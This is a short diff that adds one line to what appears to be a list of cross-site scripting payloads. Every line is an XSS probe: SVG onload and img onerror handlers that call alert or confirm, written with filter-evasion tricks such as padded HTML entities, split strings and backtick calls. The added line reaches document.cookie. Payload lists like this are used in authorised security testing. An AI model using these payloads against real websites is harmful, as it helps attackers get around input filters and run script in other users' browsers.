@@ -1,3 +1,4 @@
+<svg onload=alert&#0000000040document.cookie)>
 <Svg Only=1 OnLoad=confirm (document.domain)>
 <Img src=OnXSS OnError=confirm(1337)>
 <svg/onload=window["al"+"ert"]`1337'>
